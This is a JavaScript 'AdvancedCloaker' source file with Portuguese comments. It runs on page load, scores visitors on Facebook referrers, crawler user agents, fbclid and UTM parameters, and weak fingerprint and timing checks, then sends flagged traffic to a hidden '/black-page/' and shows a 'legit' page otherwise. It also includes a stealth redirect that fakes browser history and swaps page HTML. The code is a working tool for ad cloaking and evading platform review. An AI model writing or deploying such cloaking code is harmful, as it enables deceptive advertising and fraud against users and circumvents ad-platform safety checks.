// Versão Avançada do Cloaker com Mais Detecções
class AdvancedCloaker {
    constructor() {
        this.init();
    }

    init() {
        // Executa verificações múltiplas
        this.checkTrafficSource();
    }

    checkTrafficSource() {
        const checks = {
            referrer: this.isFromFacebookReferrer(),
            userAgent: this.isFromFacebookUserAgent(),
            urlParams: this.hasValidFacebookParams(),
            fingerprint: this.checkBrowserFingerprint(),
            timing: this.checkAccessTiming(),
            headers: this.checkHeaders()
        };

        const facebookScore = Object.values(checks).filter(Boolean).length;
        
        // Se 2 ou mais verificações passarem, considera como Facebook
        if (facebookScore >= 2) {
            this.redirectToBlackPage();
        } else {
            this.showLegitPage();
        }
    }

    isFromFacebookReferrer() {
        const referrer = document.referrer.toLowerCase();
        const facebookDomains = [
            'facebook.com', 'fb.com', 'm.facebook.com', 
            'l.facebook.com', 'lm.facebook.com', 'business.facebook.com'
        ];
        return facebookDomains.some(domain => referrer.includes(domain));
    }

    isFromFacebookUserAgent() {
        const ua = navigator.userAgent.toLowerCase();
        const facebookAgents = [
            'facebookexternalhit', 'facebot', 'facebook',
            'fbav', 'fbsv', 'fbid'
        ];
        return facebookAgents.some(agent => ua.includes(agent));
    }

    hasValidFacebookParams() {
        const url = window.location.href.toLowerCase();
        const params = new URLSearchParams(window.location.search);
        
        // Verifica parâmetros específicos do Facebook
        const facebookParams = [
            'fbclid', 'fb_source', 'fb_ref', 'fb_action_ids',
            'utm_source=facebook', 'utm_medium=social'
        ];
        
        return facebookParams.some(param => {
            if (param.includes('=')) {
                return url.includes(param);
            }
            return params.has(param);
        });
    }

    checkBrowserFingerprint() {
        // Verifica características do navegador que podem indicar Facebook
        const screen = window.screen;
        const viewport = {
            width: window.innerWidth,
            height: window.innerHeight
        };
        
        // Facebook mobile app tem características específicas
        if (viewport.width === screen.width && viewport.height < screen.height) {
            return true; // Possível app mobile
        }
        
        return false;
    }

    checkAccessTiming() {
        // Verifica se o acesso foi muito rápido (bot) ou normal (usuário)
        const loadTime = performance.now();
        return loadTime > 100 && loadTime < 5000; // Entre 100ms e 5s
    }

    checkHeaders() {
        // Esta função seria mais útil no servidor
        // No cliente, verificamos o que conseguimos
        try {
            const connection = navigator.connection;
            if (connection && connection.effectiveType) {
                return true; // Tem informações de rede
            }
        } catch (e) {
            // Ignorar erros
        }
        return false;
    }

    redirectToBlackPage() {
        // Adiciona logs para debug (remover em produção)
        console.log('Redirecionando para página black - Detectado tráfego do Facebook');
        
        // Redireciona com delay natural
        setTimeout(() => {
            window.location.href = '/black-page/';
        }, Math.random() * 200 + 100); // Delay aleatório entre 100-300ms
    }

    showLegitPage() {
        console.log('Mostrando página legítima - Tráfego normal detectado');
        // A página atual já é a legítima, não precisa fazer nada
    }

    // Método para mascarar ainda mais o redirecionamento
    stealthRedirect(url) {
        // Cria histórico falso
        history.pushState(null, '', url);
        
        // Carrega conteúdo via fetch
        fetch(url)
            .then(response => response.text())
            .then(html => {
                document.documentElement.innerHTML = html;
            })
            .catch(() => {
                // Fallback para redirecionamento normal
                window.location.href = url;
            });
    }
}

// Auto-execução
(function() {
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', () => {
            new AdvancedCloaker();
        });
    } else {
        new AdvancedCloaker();
    }
})();